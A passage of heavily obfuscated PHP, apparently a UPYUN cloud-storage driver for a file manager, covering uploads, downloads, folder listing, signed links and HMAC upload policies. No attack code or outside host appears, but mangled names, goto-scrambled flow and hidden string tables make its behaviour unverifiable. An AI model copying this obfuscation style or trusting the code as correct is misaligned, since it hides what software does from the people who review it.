$dòÄÆ©ÔÒ[1354]))) { $cš†··ÇƒŞ = $AÜ¶„ìŠÇÉ[$dòÄÆ©ÔÒ[1355]]; } else { $cš†··ÇƒŞ = json_decode($AÜ¶„ìŠÇÉ[$dòÄÆ©ÔÒ[1110]], !0); if (!$cš†··ÇƒŞ) { $cš†··ÇƒŞ = $AÜ¶„ìŠÇÉ[$dòÄÆ©ÔÒ[1110]]; } else { if (!$AÜ¶„ìŠÇÉ[$dòÄÆ©ÔÒ[740]] && isset($cš†··ÇƒŞ[$dòÄÆ©ÔÒ[1356]])) { $cš†··ÇƒŞ = $cš†··ÇƒŞ[$dòÄÆ©ÔÒ[1356]]; } } } return array($dòÄÆ©ÔÒ[1108] => $AÜ¶„ìŠÇÉ[$dòÄÆ©ÔÒ[740]], $dòÄÆ©ÔÒ[1110] => $cš†··ÇƒŞ); goto fÒ†º®§ƒÏ; A¾°ä•ª”·: $dÙèŒ¨ã­¤ = $this->ussHeaders($d–¾†‡µÓô, $eÉ‡òŸìÊ); if ($cêÚÎ–¢¯”) { $dÙèŒ¨ã­¤ = array_merge($dÙèŒ¨ã­¤, $cêÚÎ–¢¯”); } $AÜ¶„ìŠÇÉ = url_request($this->endpoint . $d–¾†‡µÓô, $eÉ‡òŸìÊ, $cš†··ÇƒŞ, $dÙèŒ¨ã­¤, $fç±ã‚ç); goto eœº¹Ñ‘÷; fÒ†º®§ƒÏ: } public function mkfile($aÂ”®ôÙ, $b¾àÉò»œİ = '', $dî³óì¥¯Ñ = REPEAT_RENAME) { if ($this->setContent($aÂ”®ôÙ, $b¾àÉò»œİ)) { return $this->getPathOuter($aÂ”®ôÙ); } return !1; } public function mkdir($d¬ÂªÎÙÂ¾, $d¥•¸ÓÀÊƒ = REPEAT_SKIP) { $AñÊ­é•äÌ =& $_SERVER[œÕÊİğö]; $f×¯ŠŞÕÁ§ = trim($d¬ÂªÎÙÂ¾, $AñÊ­é•äÌ[8]); if ($this->_isFolder($f×¯ŠŞÕÁ§)) { return $this->getPathOuter($f×¯ŠŞÕÁ§); } $e•«áÚ¤Ê– = array($AñÊ­é•äÌ[1357]); $CëÔëğ£ğË = $this->ussRequest($f×¯ŠŞÕÁ§, $AñÊ­é•äÌ[234], !1, $e•«áÚ¤Ê–); return $CëÔëğ£ğË[$AñÊ­é•äÌ[1108]] ? $this->getPathOuter($f×¯ŠŞÕÁ§) : !1; } public function copyFile($BÈöèáÂ”‚, $eĞÜ™˜Ì¡) { $eÌ¤Í®×ß =& $_SERVER[œÕÊİğö]; $AòŠÃ¬­©… = array($eÌ¤Í®×ß[1358] . "\57{$this->bucket}\x2f{$BÈöèáÂ”‚}", $eÌ¤Í®×ß[1359]); $Bæ§™ñ”¡É = $this->ussRequest($eĞÜ™˜Ì¡, $eÌ¤Í®×ß[236], !1, $AòŠÃ¬­©…); return $Bæ§™ñ”¡É[$eÌ¤Í®×ß[1108]] ? !0 : $this->getPathOuter($eĞÜ™˜Ì¡); } public function moveFile($fï÷“šÃ, $a‡—ÜŸÓ ‘) { $C—›ŸâÔÚä =& $_SERVER[œÕÊİğö]; $b–åÂË¾ö = array($C—›ŸâÔÚä[1360] . "\x2f{$this->bucket}\x2f{$fï÷“šÃ}", $C—›ŸâÔÚä[1359]); $DèŒÑ£ßî = $this->ussRequest($a‡—ÜŸÓ ‘, $C—›ŸâÔÚä[236], !1, $b–åÂË¾ö); return $DèŒÑ£ßî[$C—›ŸâÔÚä[1108]] ? !0 : $this->getPathOuter($a‡—ÜŸÓ ‘); } public function delFile($b‹‘İ‚ğèƒ) { $f­¥µÑŠ®² =& $_SERVER[œÕÊİğö]; $f•”©Ù¸ğ– = $this->ussRequest($b‹‘İ‚ğèƒ, $f­¥µÑŠ®²[1361]); return $f•”©Ù¸ğ–[$f­¥µÑŠ®²[1108]] ? !0 : !1; } public function delFolder($fâÈÛœï¹—) { goto c¦ˆìé÷‰; c¦ˆìé÷‰: $dì‘Æ×—™ =& $_SERVER[œÕÊİğö]; if (!$this->exist($fâÈÛœï¹—)) { return !0; } $this->listItemCache = !1; goto aæ–ñßóìº; eÇŒ­Ó†®ò: foreach ($d¸ÎõÀ¼ as $D¦’×«Ü) { $F­àÈ‚‘»ë = $this->ussRequest($D¦’×«Ü[$dì‘Æ×—™[38]], $dì‘Æ×—™[1361]); if (!$F­àÈ‚‘»ë[$dì‘Æ×—™[1108]]) { return !1; } } foreach ($eÖÚ©ö¯Èò as $c—Ğà”£¦Ó) { $F­àÈ‚‘»ë = $this->ussRequest($c—Ğà”£¦Ó, $dì‘Æ×—™[1361]); if (!$F­àÈ‚‘»ë[$dì‘Æ×—™[1108]]) { return !1; } } $F­àÈ‚‘»ë = $this->ussRequest($fâÈÛœï¹—, $dì‘Æ×—™[1361]); goto c÷ŞñîÈ‰‡; c÷ŞñîÈ‰‡: return $F­àÈ‚‘»ë[$dì‘Æ×—™[1108]]; goto B‹ëæÂÛ‹Ó; aæ–ñßóìº: $eÖÚ©ö¯Èò = $d¸ÎõÀ¼ = array(); $this->fileList($fâÈÛœï¹—, $eÖÚ©ö¯Èò, $d¸ÎõÀ¼, !0); $this->listItemCache = !0; goto eÇŒ­Ó†®ò; B‹ëæÂÛ‹Ó: } public function rename($bí´‘­’çÓ, $D¨„ÜìÜ³¹) { if ($this->isFile($bí´‘­’çÓ)) { $D¨„ÜìÜ³¹ = get_path_father($bí´‘­’çÓ) . $D¨„ÜìÜ³¹; return $this->moveFile($bí´‘­’çÓ, $D¨„ÜìÜ³¹); } return $this->renameObject($bí´‘­’çÓ, $D¨„ÜìÜ³¹); } public function fileInfo($aß¹Ô‹õÒŞ, $b˜»¸ÌŞ²ñ = false, $cÃ „«Û÷ = array()) { goto F˜°±„Š£²; Bƒœ™Šêõ: $E¥çˆ£ğµ[$F ©îïÑÏ¤[204]] = $E¥çˆ£ğµ[$F ©îïÑÏ¤[94]] = 0; $E¥çˆ£ğµ[$F ©îïÑÏ¤[205]] = $E¥çˆ£ğµ[$F ©îïÑÏ¤[206]] = !0; if (empty($cÃ „«Û÷)) { $cÃ „«Û÷ = $this->objectMeta($aß¹Ô‹õÒŞ); if (!$cÃ „«Û÷) { return $E¥çˆ£ğµ; } } goto c÷Ğ»¼Ù™è; F˜°±„Š£²: $F ©îïÑÏ¤ =& $_SERVER[œÕÊİğö]; $E¥çˆ£ğµ = array($F ©îïÑÏ¤[38] => $this->pathThis($aß¹Ô‹õÒŞ), $F ©îïÑÏ¤[86] => $this->getPathOuter($F ©îïÑÏ¤[8] . $aß¹Ô‹õÒŞ), $F ©îïÑÏ¤[39] => $F ©îïÑÏ¤[203], $F ©îïÑÏ¤[88] => isset($cÃ „«Û÷[$F ©îïÑÏ¤[88]]) ? $cÃ „«Û÷[$F ©îïÑÏ¤[88]] : 0, $F ©îïÑÏ¤[178] => $this->ext($aß¹Ô‹õÒŞ)); if ($b˜»¸ÌŞ²ñ) { return $E¥çˆ£ğµ; } goto Bƒœ™Šêõ; f ›ÓÏ‡ëë: return $E¥çˆ£ğµ; goto fî™Í¦°¸ˆ; c÷Ğ»¼Ù™è: $E¥çˆ£ğµ[$F ©îïÑÏ¤[204]] = intval($cÃ „«Û÷[$F ©îïÑÏ¤[1362]]); $E¥çˆ£ğµ[$F ©îïÑÏ¤[94]] = intval($cÃ „«Û÷[$F ©îïÑÏ¤[1363]]); $E¥çˆ£ğµ[$F ©îïÑÏ¤[88]] = $cÃ „«Û÷[$F ©îïÑÏ¤[88]]; goto f ›ÓÏ‡ëë; fî™Í¦°¸ˆ: } public function folderInfo($fƒ”¸²À§©, $eáÕ‚·Á‚ = false) { goto c¶¸¶–åÖø; dœå¶ ö™: $c‘½ƒ¢¿ëƒ[$d®óÃ¿©š¶[204]] = $c‘½ƒ¢¿ëƒ[$d®óÃ¿©š¶[94]] = 0; $c‘½ƒ¢¿ëƒ[$d®óÃ¿©š¶[205]] = $c‘½ƒ¢¿ëƒ[$d®óÃ¿©š¶[206]] = !0; if (empty($FõÅŞ‘ƒì—)) { $FõÅŞ‘ƒì— = $this->objectMeta($fƒ”¸²À§©); if (!$FõÅŞ‘ƒì—) { return $c‘½ƒ¢¿ëƒ; } } goto a¦¤¬µ¾Ä; a¦¤¬µ¾Ä: $c‘½ƒ¢¿ëƒ[$d®óÃ¿©š¶[204]] = intval($FõÅŞ‘ƒì—[$d®óÃ¿©š¶[1362]]); $c‘½ƒ¢¿ëƒ[$d®óÃ¿©š¶[94]] = intval($FõÅŞ‘ƒì—[$d®óÃ¿©š¶[1363]]); return $c‘½ƒ¢¿ëƒ; goto FâËÕµõî¤; c¶¸¶–åÖø: $d®óÃ¿©š¶ =& $_SERVER[œÕÊİğö]; $c‘½ƒ¢¿ëƒ = array($d®óÃ¿©š¶[38] => $this->pathThis($fƒ”¸²À§©), $d®óÃ¿©š¶[86] => $this->getPathOuter($d®óÃ¿©š¶[8] . $fƒ”¸²À§©), $d®óÃ¿©š¶[39] => $d®óÃ¿©š¶[87]); if ($eáÕ‚·Á‚) { return $c‘½ƒ¢¿ëƒ; } goto dœå¶ ö™; FâËÕµõî¤: } private function listObjs($aæëÅ¿ç´®, $CÔîĞ‹ëä = 0, $EÄ‚øÌ¢‹ = 1000) { $FØÀ«…îñË =& $_SERVER[œÕÊİğö]; $b‰…ŒƒÜ“ = array($FØÀ«…îñË[1364], $FØÀ«…îñË[1365] . $EÄ‚øÌ¢‹); if ($CÔîĞ‹ëä) { $b‰…ŒƒÜ“[] = $FØÀ«…îñË[1366] . $CÔîĞ‹ëä; } $fŞ±µÚäÀ„ = $this->ussRequest($aæëÅ¿ç´®, $FØÀ«…îñË[238], !1, $b‰…ŒƒÜ“); return !$fŞ±µÚäÀ„[$FØÀ«…îñË[1108]] ? !1 : $fŞ±µÚäÀ„[$FØÀ«…îñË[1110]]; } private function fileList($dÜ»‹Å„, &$d»×´è¹¬, &$d³Æ…áÚù‚, $f¦™å¸’ÖÁ = false) { goto cÓæãó›Í›; f±­òèš: $Dáåßˆ÷ÌÕ = rtrim($dÜ»‹Å„, $c§Æ£¸ÎŞ£[8]) . $c§Æ£¸ÎŞ£[8]; $A¸‚ö¡÷Ÿ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $E¥ŸØ«é‘ = $this->listObjs($dÜ»‹Å„, $cÎœÈ„, $aÆ”“°„¢Š); if (!$E¥ŸØ«é‘) { return !1; } $cÎœÈ„ = isset($E¥ŸØ«é‘[$c§Æ£¸ÎŞ£[1367]]) ? $E¥ŸØ«é‘[$c§Æ£¸ÎŞ£[1367]] : $c§Æ£¸ÎŞ£[43]; $Fµ‚”Î°ÅÂ = isset($E¥ŸØ«é‘[$c§Æ£¸ÎŞ£[1368]]) ? $E¥ŸØ«é‘[$c§Æ£¸ÎŞ£[1368]] : array(); foreach ($Fµ‚”Î°ÅÂ as $AÚ‘ÆÅ·ïò) { $fäƒ®ßŒ¸ = $AÚ‘ÆÅ·ïò[$c§Æ£¸ÎŞ£[39]] == $c§Æ£¸ÎŞ£[87] ? !0 : !1; $d¿ÇŸÙ½Ã = ltrim($Dáåßˆ÷ÌÕ . $AÚ‘ÆÅ·ïò[$c§Æ£¸ÎŞ£[38]], $c§Æ£¸ÎŞ£[8]) . ($fäƒ®ßŒ¸ ? $c§Æ£¸ÎŞ£[8] : $c§Æ£¸ÎŞ£[43]); $bøÀ’•İàĞ = array($c§Æ£¸ÎŞ£[38] => $d¿ÇŸÙ½Ã, $c§Æ£¸ÎŞ£[39] => $fäƒ®ßŒ¸ ? $c§Æ£¸ÎŞ£[87] : $c§Æ£¸ÎŞ£[203], $c§Æ£¸ÎŞ£[88] => $AÚ‘ÆÅ·ïò[$c§Æ£¸ÎŞ£[345]], $c§Æ£¸ÎŞ£[1363] => $AÚ‘ÆÅ·ïò[$c§Æ£¸ÎŞ£[1369]]); if ($A¸‚ö¡÷Ÿ) { $this->cacheMethod($c§Æ£¸ÎŞ£[209], $d¿ÇŸÙ½Ã, $fäƒ®ßŒ¸); $this->cacheMethod($c§Æ£¸ÎŞ£[210], $d¿ÇŸÙ½Ã, $bøÀ’•İàĞ); } if ($fäƒ®ßŒ¸) { $d»×´è¹¬[] = $d¿ÇŸÙ½Ã; if ($f¦™å¸’ÖÁ) { $this->fileList($d¿ÇŸÙ½Ã, $d»×´è¹¬, $d³Æ…áÚù‚, $f¦™å¸’ÖÁ); } continue; } $d³Æ…áÚù‚[] = $bøÀ’•İàĞ; } if (count($Fµ‚”Î°ÅÂ) < $aÆ”“°„¢Š) { break; } } goto DÍáŒ“ë–Ç; cÓæãó›Í›: $c§Æ£¸ÎŞ£ =& $_SERVER[œÕÊİğö]; $cÎœÈ„ = $c§Æ£¸ÎŞ£[43]; $aÆ”“°„¢Š = 1000; goto f±­òèš; DÍáŒ“ë–Ç: if ($A¸‚ö¡÷Ÿ) { $this->cacheMethod($c§Æ£¸ÎŞ£[209], $dÜ»‹Å„, !0); } goto C¡â‚Àëä¥; C¡â‚Àëä¥: } public function listPath($B½ÉåÍÒ³ , $eİª¹¦©· = false) { $fª³ìÓ‡áâ =& $_SERVER[œÕÊİğö]; $aôãÕµ–Ä› = $D÷˜ÈºâÒ = array(); $this->fileList($B½ÉåÍÒ³ , $aôãÕµ–Ä›, $D÷˜ÈºâÒ); foreach ($aôãÕµ–Ä› as $Bİîíß => $F‹ÑƒÛ£‡) { $aôãÕµ–Ä›[$Bİîíß] = $this->folderInfo($F‹ÑƒÛ£‡, $eİª¹¦©·); } foreach ($D÷˜ÈºâÒ as $Bİîíß => $F‹ÑƒÛ£‡) { $D÷˜ÈºâÒ[$Bİîíß] = $this->fileInfo($F‹ÑƒÛ£‡[$fª³ìÓ‡áâ[38]], $eİª¹¦©·, $F‹ÑƒÛ£‡); } return array($fª³ìÓ‡áâ[85] => $aôãÕµ–Ä›, $fª³ìÓ‡áâ[84] => $D÷˜ÈºâÒ); } public function has($D©¶Œ„’÷, $cª·ò¼É = false, $cŒéçÅ®Š = true) { goto fÃ¨ä›©º; Eˆ½áŒÛ“ã: $DÂÀ„İõ˜ = 0; $e‰¯àß¬õ§ = 0; $BÚõ“ëˆ—Æ = rtrim($D©¶Œ„’÷, $d¨Œ¡øŸ§[8]) . $d¨Œ¡øŸ§[8]; goto fã»ö£”ä„; fÃ¨ä›©º: $d¨Œ¡øŸ§ =& $_SERVER[œÕÊİğö]; $d†İŞºİÅ­ = $d¨Œ¡øŸ§[43]; $AŒöò§«¯ = 500; goto Eˆ½áŒÛ“ã; fã»ö£”ä„: while (!0) { check_abort(); $B²¯­˜óôâ = $this->listObjs($D©¶Œ„’÷, $d†İŞºİÅ­, $AŒöò§«¯); if (!$B²¯­˜óôâ) { return !1; } $d†İŞºİÅ­ = isset($B²¯­˜óôâ[$d¨Œ¡øŸ§[1367]]) ? $B²¯­˜óôâ[$d¨Œ¡øŸ§[1367]] : $d¨Œ¡øŸ§[43]; $FˆØÃ†¬ğ„ = isset($B²¯­˜óôâ[$d¨Œ¡øŸ§[1368]]) ? $B²¯­˜óôâ[$d¨Œ¡øŸ§[1368]] : array(); if (empty($FˆØÃ†¬ğ„)) { break; } $EŒìõ÷Œ… = array_filter($FˆØÃ†¬ğ„, function ($f×Ø¢…¯ã¼) { $EïãÌ¥‚ˆÆ =& $_SERVER[œÕÊİğö]; return $f×Ø¢…¯ã¼[$EïãÌ¥‚ˆÆ[39]] == $EïãÌ¥‚ˆÆ[87]; }); $fÑªÇ›â¹ = count($FˆØÃ†¬ğ„); $EŒìõ÷Œ… = count($EŒìõ÷Œ…); $E–•Ô³ÄÛ² = $fÑªÇ›â¹ - $EŒìõ÷Œ…; if ($cª·ò¼É) { $e‰¯àß¬õ§ += $EŒìõ÷Œ…; $DÂÀ„İõ˜ += $E–•Ô³ÄÛ²; if ($fÑªÇ›â¹ < $AŒöò§«¯) { break; } continue; } if ($cŒéçÅ®Š) { if ($E–•Ô³ÄÛ²) { return !0; } } else { if ($EŒìõ÷Œ…) { return !0; } } if ($fÑªÇ›â¹ < $AŒöò§«¯) { break; } } if ($cª·ò¼É) { return array($d¨Œ¡øŸ§[213] => $DÂÀ„İõ˜, $d¨Œ¡øŸ§[214] => $e‰¯àß¬õ§); } return !1; goto AîàˆãŸ‡µ; AîàˆãŸ‡µ: } public function listAll($dëåšğÉ½…) { goto AáÎÒÕ¸©»; aÂõñ‘Î—µ: $E¢Ğ ±êÑË = array(); foreach ($A×‹±‹ÕÀ¤ as $CÔÒÔäõ¡) { $E¢Ğ ±êÑË[$CÔÒÔäõ¡[$b¼îÒ®ïí[38]]] = $CÔÒÔäõ¡[$b¼îÒ®ïí[88]]; } foreach ($cîÅ´İÌ¯Ø as $CÔÒÔäõ¡) { if (is_string($CÔÒÔäõ¡)) { $E¢Ğ ±êÑË[$CÔÒÔäõ¡] = 0; } } goto A¾Ôœ˜ìÔ©; AáÎÒÕ¸©»: $b¼îÒ®ïí =& $_SERVER[œÕÊİğö]; $cîÅ´İÌ¯Ø = $A×‹±‹ÕÀ¤ = array(); $this->fileList($dëåšğÉ½…, $cîÅ´İÌ¯Ø, $A×‹±‹ÕÀ¤, !0); goto aÂõñ‘Î—µ; A¾Ôœ˜ìÔ©: return $this->listAllFiles($dëåšğÉ½…, array_keys($E¢Ğ ±êÑË), $E¢Ğ ±êÑË); goto AĞÏ²î¦Òç; AĞÏ²î¦Òç: } public function canRead($Dğõùğˆô´) { return $this->exist($Dğõùğˆô´) ? !0 : !1; } public function canWrite($C¿¹­ê”Ì) { return $this->exist($C¿¹­ê”Ì) ? !0 : !1; } public function getContent($c ¹‰ã†ªİ) { return $this->fileSubstr($c ¹‰ã†ªİ, 0, -1); } public function setContent($b±ìÔÏ ùØ, $d‡Íœóá““ = '') { $AÑ´„¸¥³ =& $_SERVER[œÕÊİğö]; if (!$d‡Íœóá““) { $F¿‹ˆ†ãƒ¶ = $this->ussRequest($b±ìÔÏ ùØ, $AÑ´„¸¥³[234]); return $F¿‹ˆ†ãƒ¶[$AÑ´„¸¥³[1108]]; } $D³Ö³¢™ïÖ = $this->tempFile($this->pathThis($b±ìÔÏ ùØ)); file_put_contents($D³Ö³¢™ïÖ, $d‡Íœóá““); if ($this->upload($b±ìÔÏ ùØ, $D³Ö³¢™ïÖ)) { $this->tempFileRemve($D³Ö³¢™ïÖ); return !0; } return !1; } public function fileSubstr($cáÛ…Ú½†Ò, $bÍøºÁò‰›, $f“ÁŠå“Í¥) { $DâÔ®Úİ¡İ =& $_SERVER[œÕÊİğö]; if (!($Dä¡ÄÖ = $this->link($cáÛ…Ú½†Ò))) { return !1; } $aØİ½©Â¹Ğ = !1; if ($f“ÁŠå“Í¥ > 0) { $FŒœã¹´Õˆ = $bÍøºÁò‰› + $f“ÁŠå“Í¥ - 1; $aØİ½©Â¹Ğ = array($DâÔ®Úİ¡İ[1330] . $bÍøºÁò‰› . $DâÔ®Úİ¡İ[463] . $FŒœã¹´Õˆ); } $fŒ¥ñ‹†¨ = url_request($Dä¡ÄÖ, $DâÔ®Úİ¡İ[238], !1, $aØİ½©Â¹Ğ); return $fŒ¥ñ‹†¨[$DâÔ®Úİ¡İ[740]] ? $fŒ¥ñ‹†¨[$DâÔ®Úİ¡İ[1110]] : !1; } public function upload($d™«‘ºéºù, $CçÃ½Äñï», $fòøäÜèµ© = false, $A´µÆ“ = REPEAT_REPLACE) { goto fšºò´æš; FŠ¶¾¢Öìä: if (!$b’®Ú…ØŠ¸[$aëÈğŞ´Ñ[1108]]) { return !1; } $E¡Ï¿½’ˆ = $b’®Ú…ØŠ¸[$aëÈğŞ´Ñ[1110]]; $d‹˜ï“İ¤‡ = 0; goto d¡°ÁÍÀæ; Fà„¢æ´’Ñ: $EÂ†È“¢…ö = 1024 * 1024 * 10; $AÖùáÒµ“Ğ = array($aëÈğŞ´Ñ[1371], $aëÈğŞ´Ñ[1372] . $e»ãÖ×ƒ½Ì, $aëÈğŞ´Ñ[1373], $aëÈğŞ´Ñ[1374] . $EÂ†È“¢…ö); $b’®Ú…ØŠ¸ = $this->ussRequest($d™«‘ºéºù, $aëÈğŞ´Ñ[236], !1, $AÖùáÒµ“Ğ); goto FŠ¶¾¢Öìä; f‘Ûò™îŸÀ: do { $b¶ŞêÅ•ù» = $E¡Ï¿½’ˆ[$aëÈğŞ´Ñ[1376]]; fseek_64($A¤ßÆ ¹Ãå, $d‹˜ï“İ¤‡); $DÒôØÔ = fread($A¤ßÆ ¹Ãå, $b¶ŞêÅ•ù»); $cÎÃ¯‘‡ˆ = 0; do { $cÎÃ¯‘‡ˆ++; $E¡Ï¿½’ˆ = $this->uploadPart($d™«‘ºéºù, $E¡Ï¿½’ˆ, $DÒôØÔ); } while (!$E¡Ï¿½’ˆ && $cÎÃ¯‘‡ˆ < 3); if (!$E¡Ï¿½’ˆ) { return !1; } $B‹Åå½´Å  = $E¡Ï¿½’ˆ[$aëÈğŞ´Ñ[1375]]; $d‹˜ï“İ¤‡ += $b¶ŞêÅ•ù»; } while ($B‹Åå½´Å  != -1); fclose($A¤ßÆ ¹Ãå); $AÖùáÒµ“Ğ = array($aëÈğŞ´Ñ[1377], $aëÈğŞ´Ñ[1378] . $E¡Ï¿½’ˆ[$aëÈğŞ´Ñ[1379]], $aëÈğŞ´Ñ[1373]); goto aŞŠÒ«İ†Å; fšºò´æš: $aëÈğŞ´Ñ =& $_SERVER[œÕÊİğö]; $e»ãÖ×ƒ½Ì = IO::size($CçÃ½Äñï»); if ($e»ãÖ×ƒ½Ì <= 1024 * 1024 * 200) { $D˜¯ÜÑ÷—¢ = array($aëÈğŞ´Ñ[1370] . $CçÃ½Äñï»); $b’®Ú…ØŠ¸ = $this->ussRequest($d™«‘ºéºù, $aëÈğŞ´Ñ[236], $D˜¯ÜÑ÷—¢); return $b’®Ú…ØŠ¸[$aëÈğŞ´Ñ[1108]] ? $this->getPathOuter($d™«‘ºéºù) : !1; } goto Fà„¢æ´’Ñ; d¡°ÁÍÀæ: $B‹Åå½´Å  = $E¡Ï¿½’ˆ[$aëÈğŞ´Ñ[1375]]; $A¤ßÆ ¹Ãå = fopen($CçÃ½Äñï», $aëÈğŞ´Ñ[1281]); if (!$A¤ßÆ ¹Ãå) { return !1; } goto f‘Ûò™îŸÀ; aŞŠÒ«İ†Å: $b’®Ú…ØŠ¸ = $this->ussRequest($d™«‘ºéºù, $aëÈğŞ´Ñ[236], !1, $AÖùáÒµ“Ğ); return $b’®Ú…ØŠ¸[$aëÈğŞ´Ñ[1108]] ? $this->getPathOuter($fƒ‡“ó‚È’) : !1; goto FˆŸ„ÉÑ„; FˆŸ„ÉÑ„: } private function uploadPart($AĞ’¢¹¥ˆí, $e–ˆ½˜…¶, &$BÕ® Ä¢­´) { $a²¤ê»Ï¿ =& $_SERVER[œÕÊİğö]; $E‡›¤‡Ô† = array($a²¤ê»Ï¿[1380], $a²¤ê»Ï¿[1378] . $e–ˆ½˜…¶[$a²¤ê»Ï¿[1379]], $a²¤ê»Ï¿[1381] . $e–ˆ½˜…¶[$a²¤ê»Ï¿[1375]], $a²¤ê»Ï¿[151] . $e–ˆ½˜…¶[$a²¤ê»Ï¿[1376]]); $E¤«°Æß¿ù = $this->ussRequest($AĞ’¢¹¥ˆí, $a²¤ê»Ï¿[236], $BÕ® Ä¢­´, $E‡›¤‡Ô†); return !$E¤«°Æß¿ù[$a²¤ê»Ï¿[1108]] ? $E¤«°Æß¿ù[$a²¤ê»Ï¿[1108]] : $E¤«°Æß¿ù[$a²¤ê»Ï¿[1110]]; } public function uploadFormData($C†ŞºÖ¼ì, $B…¡†×¦ = 3600) { return $this->uploadPolicy($C†ŞºÖ¼ì, $B…¡†×¦); } public function multiUploadFormData($DˆÎÁ…”‹‡, $c‡Ÿ‰ÜÎË¿ = 3600) { $eÀ† ¬ˆ–Ò =& $_SERVER[œÕÊİğö]; $bØÌÁŒÆâ = (int) $GLOBALS[$eÀ† ¬ˆ–Ò[7]][$eÀ† ¬ˆ–Ò[88]]; return $this->uploadPolicy($DˆÎÁ…”‹‡, $c‡Ÿ‰ÜÎË¿, $bØÌÁŒÆâ); } private function uploadPolicy($díã»ÙĞìâ, $d‚±Ğ¯„õ = 3600, $f‰ãï×©… = 0) { goto f¯½¨ËÒ»Ş; e‰ìÎ‡šÒ: $aËá±é»  = array($c¾—™†Áœ…[1382] => $this->bucket, $c¾—™†Áœ…[1383] => $díã»ÙĞìâ, $c¾—™†Áœ…[1384] => time() + $d‚±Ğ¯„õ, $c¾—™†Áœ…[1385] => $f™¸ÇÀ‹šæ); if ($f‰ãï×©…) { $aËá±é» [$c¾—™†Áœ…[1297]] = $f‰ãï×©…; } $EŸËç­ÆÜó = base64_encode(json_encode($aËá±é» )); goto C­É¢ÄÆ•£; C­É¢ÄÆ•£: $Fõ¾©ˆ±œ‹ = base64_encode(hash_hmac($c¾—™†Áœ…[1352], "\120\x4f\x53\124\46{$bÈª­‹®¹}\x26{$f™¸ÇÀ‹šæ}\46{$EŸËç­ÆÜó}", md5("{$this->userpass}"), !0)); $c˜æÇ·–Ğˆ = array($c¾—™†Áœ…[1223] => $EŸËç­ÆÜó, $c¾—™†Áœ…[1386] => "\125\x50\131\x55\x4e\x20{$this->username}\72{$Fõ¾©ˆ±œ‹}", $c¾—™†Áœ…[185] => $this->endpoint . $bÈª­‹®¹); return $c˜æÇ·–Ğˆ; goto c²ØÄÎÇ‡×; f¯½¨ËÒ»Ş: $c¾—™†Áœ… =& $_SERVER[œÕÊİğö]; $bÈª­‹®¹ = $c¾—™†Áœ…[8] . $this->bucket; $f™¸ÇÀ‹šæ = gmdate($c¾—™†Áœ…[1317]); goto e‰ìÎ‡šÒ; c²ØÄÎÇ‡×: } public function download($A§Ü†Â¿Ÿ, $FÃ–Û“°) { goto FÎç…¿Øå; dƒ³¼Üâ‚: $DÒË §ªïâ = 1024 * 200; $fß«ñ§Ôâ = fopen($Aº³¦¤‡‰, $_SERVER[œÕÊİğö][1336]); while (!0) { $bÃ¤ù¬Éª = $this->fileSubstr($A§Ü†Â¿Ÿ, $C©Å•È»“Ó, $DÒË §ªïâ); if ($bÃ¤ù¬Éª === !1) { return !1; } fwrite($fß«ñ§Ôâ, $bÃ¤ù¬Éª); $C©Å•È»“Ó += $DÒË §ªïâ; if (strlen($bÃ¤ù¬Éª) < $DÒË §ªïâ) { break; } } goto Fšš÷ªöİ¼; FÎç…¿Øå: $Aº³¦¤‡‰ = IO::getPathInner(IO::mkfile($FÃ–Û“°)); if (!($bƒ‹õ¥ÇÙŞ = $this->link($A§Ü†Â¿Ÿ))) { return !1; } $C©Å•È»“Ó = 0; goto dƒ³¼Üâ‚; Fšš÷ªöİ¼: fclose($fß«ñ§Ôâ); return $FÃ–Û“°; goto aÈˆŒğš‹; aÈˆŒğš‹: } public function link($bÆ©Ó‰ù–ƒ, $A®Œ©§Î´æ = array()) { $CÖŠËß¢¨ =& $_SERVER[œÕÊİğö]; $bÆ©Ó‰ù–ƒ = trim($bÆ©Ó‰ù–ƒ, $CÖŠËß¢¨[8]); if (!empty($this->token)) { $fÄË»æù¯• = strtotime(date($CÖŠËß¢¨[1387])); $C›“Å‡å¢¤ = substr(md5($this->token . $CÖŠËß¢¨[292] . $fÄË»æù¯• . $CÖŠËß¢¨[1388] . $bÆ©Ó‰ù–ƒ), 12, 8) . $fÄË»æù¯•; $A®Œ©§Î´æ[] = $CÖŠËß¢¨[1389] . $C›“Å‡å¢¤; } $DÑŠ‰ãÚ‡¸ = !empty($A®Œ©§Î´æ) ? $CÖŠËß¢¨[80] . implode($CÖŠËß¢¨[292], $A®Œ©§Î´æ) : $CÖŠËß¢¨[43]; return $this->getHost() . $CÖŠËß¢¨[8] . $bÆ©Ó‰ù–ƒ . $DÑŠ‰ãÚ‡¸; } public function fileOut($D‘ñ¶±…÷, $bª¤Ï¤ø‡ˆ = false, $DºŒùøÍ·¹ = false, $aº¯ã¥µ‡— = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($D‘ñ¶±…÷, $bª¤Ï¤ø‡ˆ, $DºŒùøÍ·¹, $aº¯ã¥µ‡—); } if (!$DºŒùøÍ·¹) { $DºŒùøÍ·¹ = $this->pathThis($D‘ñ¶±…÷); } $a—ÈªÓºÄÀ = $bª¤Ï¤ø‡ˆ ? array($_SERVER[œÕÊİğö][1390] . rawurlencode($DºŒùøÍ·¹)) : array(); $cÜ¦ˆƒö‹‰ = $this->link($D‘ñ¶±…÷, $a—ÈªÓºÄÀ); $this->fileOutLink($cÜ¦ˆƒö‹‰); } public function fileOutServer($a×÷›ó°ÓÔ, $bĞ‘Ì¨‚†Ü = false, $d‹ˆŒ¾ÄÂ´ = false, $cÙ¢è„Â±‡ = '') { parent::fileOut($a×÷›ó°ÓÔ, $bĞ‘Ì¨‚†Ü, $d‹ˆŒ¾ÄÂ´, $cÙ¢è„Â±‡); } public function fileOutImage($E¯ìò“Ü—ì, $cÎ ó…¢½ = 250) { $eäÄì¬¢áÏ = $this->link($E¯ìò“Ü—ì . $_SERVER[œÕÊİğö][1391] . $cÎ ó…¢½); $this->fileOutLink($eäÄì¬¢áÏ); } public function fileOutImageServer($b†›„›“…î, $eæ¤Áà‚ÔÍ = 250) { parent::fileOutImage($b†›„›“…î, $eæ¤Áà‚ÔÍ); } public function hashMd5($EÌ ä±­ÙŠ) { $bù·Ğ»À =& $_SERVER[œÕÊİğö]; $aùÎ’ÜÊò = $this->_objectMeta($EÌ ä±­ÙŠ); return isset($aùÎ’ÜÊò[$bù·Ğ»À[218]]) ? $aùÎ’ÜÊò[$bù·Ğ»À[218]] : !1; } public function size($b‹šù»†Ä) { $då¨Ÿƒ¼• = $this->objectMeta($b‹šù»†Ä); return $då¨Ÿƒ¼• ? 